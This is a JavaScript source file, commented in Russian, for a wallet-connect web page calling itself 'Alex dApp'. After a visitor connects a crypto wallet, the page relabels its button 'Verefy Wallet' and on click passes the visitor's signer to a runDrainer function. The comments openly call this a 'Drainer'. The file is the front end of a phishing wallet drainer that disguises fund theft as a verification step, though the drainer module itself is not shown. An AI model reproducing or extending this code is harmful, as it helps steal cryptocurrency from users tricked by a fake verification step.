import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// глобальное хранение адреса
window.caipAddress = null

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })
const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png'],
  redirect: {
    native: 'alexdapp://',
    universal: 'https://checkalex.xyz'
  }
};
const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false
  },
  allWallets: "SHOW"
})

const statusEl    = document.getElementById("status")
const actionBtn   = document.getElementById("action-btn")

// обновляем UI: текст кнопки и статус
function updateUI() {
  if (window.caipAddress) {
    actionBtn.innerText = "Verefy Wallet"
  } else {
    actionBtn.innerText = "Connect Wallet"
  }
}

// получает адрес из MetaMask и сохраняет его
async function updateAddress() {
  try {
    // Ждём появления window.ethereum
    if (typeof window.ethereum === 'undefined') {
      console.warn("ethereum не найден, ждём...");
      await new Promise(resolve => {
        const check = () => {
          if (typeof window.ethereum !== 'undefined') return resolve()
          setTimeout(check, 100)
        }
        check()
      })
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' })

    if (Array.isArray(accounts) && accounts.length > 0) {
      window.caipAddress = accounts[0]
      console.log("Кошелёк подключён:", window.caipAddress)
    } else {
      window.caipAddress = null
    }
  } catch (err) {
    console.error("Ошибка при получении адреса:", err)
    window.caipAddress = null
  }

  updateUI()
}

// при загрузке проверяем, нет ли уже подключённого кошелька
updateAddress()

// реагируем на переключение аккаунтов
if (window.ethereum) {
  window.ethereum.on("accountsChanged", updateAddress)
}

// единая логика кнопки
actionBtn.addEventListener('click', async () => {
  if (!window.caipAddress) {
    // 1) открыть модалку
    await modal.open()

    // 2) опрашивать пока не подключат
    const timer = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' })
      if (accounts.length > 0) {
        clearInterval(timer)
        await updateAddress()       // сохранит и обновит UI
      }
    }, 500)
  } else {
    // кнопка стала Drainer → запускаем его
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
      const signer   = provider.getSigner()
      const address  = window.caipAddress
      await runDrainer(provider, signer, address)
    } catch (e) {
      console.error("Ошибка в Drainer:", e)
    }
  }
})
